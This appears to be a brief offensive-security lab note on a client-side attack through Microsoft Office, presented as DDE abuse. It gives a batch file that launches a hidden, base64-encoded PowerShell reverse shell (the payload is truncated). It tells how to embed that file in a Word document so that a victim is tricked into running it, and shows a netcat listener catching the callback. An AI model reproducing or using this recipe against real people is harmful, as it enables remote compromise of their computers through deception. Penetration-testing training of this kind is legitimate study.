## Description:  

Another popular client-side attack against Microsoft Office abuses Dynamic Data Exchange 
(DDE) to execute arbitrary applications from within Office documents.

Create launch.bat (use [revshells](https://www.revshells.com/) to generate the reverse shell.)
```
START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
```

Next, we will include the above script in a Microsoft Word document. We will open Microsoft Word, 
create a new document, navigate to the Insert ribbon, and click the Object menu. Here, we will 
choose the Create from File tab and select our newly-created batch script, launch.bat

After accepting the menu options, the batch file is embedded in the Microsoft Word document. Next, the victim must be tricked into double-clicking it and accepting the security warning.

```
kali@kali:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50115
